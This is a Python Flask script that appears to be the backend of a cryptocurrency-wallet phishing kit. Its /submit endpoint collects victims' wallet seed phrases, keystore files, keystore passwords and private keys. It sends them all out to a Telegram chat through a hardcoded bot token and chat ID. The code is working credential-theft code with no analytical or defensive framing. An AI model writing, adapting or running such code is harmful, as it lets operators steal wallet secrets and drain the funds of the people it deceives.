from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Replace 'YOUR_BOT_TOKEN' with your Telegram Bot token
bot_token = '6505854985:AAG6uiVO9X1RICEjMhDw09M9_-Bi-Qhj6js'
# Replace 'YOUR_CHAT_ID' with your Telegram chat ID
chat_id = '1093324452'

def send_message_to_telegram(message):
    telegram_api = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(telegram_api, json=params)
    return response.json()

@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        data = request.form
        wallet = data.get('wallet')
        phrase = data.get('phrase')
        keystore_json = data.get('keystorejson')
        keystore_password = data.get('keystorepassword')
        private_key = data.get('privatekey')

        # Format the message to be sent to Telegram
        message = f"New form submission:\nWallet: {wallet}\nPhrase: {phrase}\nKeystore JSON: {keystore_json}\nKeystore Password: {keystore_password}\nPrivate Key: {private_key}"

        # Send the message to Telegram
        send_message_to_telegram(message)
        
        return jsonify({'message': 'Form submitted successfully!'}), 200
    except Exception as e:
        print('Error:', e)
        return jsonify({'error': 'An error occurred while processing the form submission.'}), 500

if __name__ == '__main__':
    app.run(debug=True)
